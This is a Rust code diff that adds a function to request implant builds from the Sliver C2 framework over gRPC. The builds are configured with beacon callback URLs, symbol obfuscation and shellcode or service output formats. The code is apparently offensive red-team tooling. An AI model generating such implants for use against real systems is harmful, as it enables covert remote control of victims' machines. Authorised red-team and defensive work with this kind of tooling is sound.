@@ -1,7 +1,7 @@
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 
 use crate::sliver::connection::SliverConnection;
-use crate::sliver::proto::commonpb;
+use crate::sliver::proto::{clientpb, commonpb};
 
 /// A simplified implant build representation for API responses.
 #[derive(Debug, Clone, Serialize)]
@@ -57,6 +57,95 @@ pub async fn list_builds(
             }
         })
         .collect())
+}
+
+#[derive(Deserialize)]
+pub struct GeneratePayloadRequest {
+    pub name: String,
+    pub goos: String,
+    pub goarch: String,
+    pub format: String,       // "exe" | "shared" | "shellcode" | "service"
+    pub is_beacon: bool,
+    pub protocol: String,     // "mtls" | "http" | "https" | "dns"
+    pub lhost: String,
+    pub lport: u16,
+}
+
+#[derive(Serialize)]
+pub struct GenerateResponse {
+    pub success: bool,
+    pub message: String,
+    pub implant_name: Option<String>,
+}
+
+/// Generate an implant via the Sliver gRPC `Generate` RPC.
+pub async fn generate_implant(
+    conn: &mut SliverConnection,
+    req: GeneratePayloadRequest,
+) -> GenerateResponse {
+    let format = match req.format.as_str() {
+        "shared" => clientpb::OutputFormat::SharedLib,
+        "shellcode" => clientpb::OutputFormat::Shellcode,
+        "service" => clientpb::OutputFormat::Service,
+        _ => clientpb::OutputFormat::Executable,
+    };
+
+    let c2_url = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
+
+    let generate_req = clientpb::GenerateReq {
+        name: req.name.clone(),
+        config: Some(clientpb::ImplantConfig {
+            goos: req.goos,
+            goarch: req.goarch,
+            format: format.into(),
+            is_beacon: req.is_beacon,
+            debug: false,
+            evasion: false,
+            obfuscate_symbols: true,
+            sgn_enabled: true,
+            is_shared_lib: format == clientpb::OutputFormat::SharedLib,
+            is_service: format == clientpb::OutputFormat::Service,
+            is_shellcode: format == clientpb::OutputFormat::Shellcode,
+            include_http: req.protocol.starts_with("http"),
+            include_mtls: req.protocol == "mtls",
+            include_dns: req.protocol == "dns",
+            c2: vec![clientpb::ImplantC2 {
+                url: c2_url,
+                priority: 1,
+                ..Default::default()
+            }],
+            reconnect_interval: 60,
+            max_connection_errors: 100,
+            poll_timeout: 3600, // 1h
+            beacon_interval: 30,
+            beacon_jitter: 10,
+            ..Default::default()
+        }),
+    };
+
+    match conn
+        .client
+        .generate(tonic::Request::new(generate_req))
+        .await
+    {
+        Ok(response) => {
+            let out = response.into_inner();
+            tracing::info!("Payload generated: {} (build_id: {})", out.implant_name, out.implant_build_id);
+            GenerateResponse {
+                success: true,
+                message: format!("Payload '{}' generated", out.implant_name),
+                implant_name: Some(out.implant_name),
+            }
+        }
+        Err(e) => {
+            tracing::error!("Generate failed: {}", e);
+            GenerateResponse {
+                success: false,
+                message: format!("Generate failed: {}", e),
+                implant_name: None,
+            }
+        }
+    }
 }
 
 #[cfg(test)]
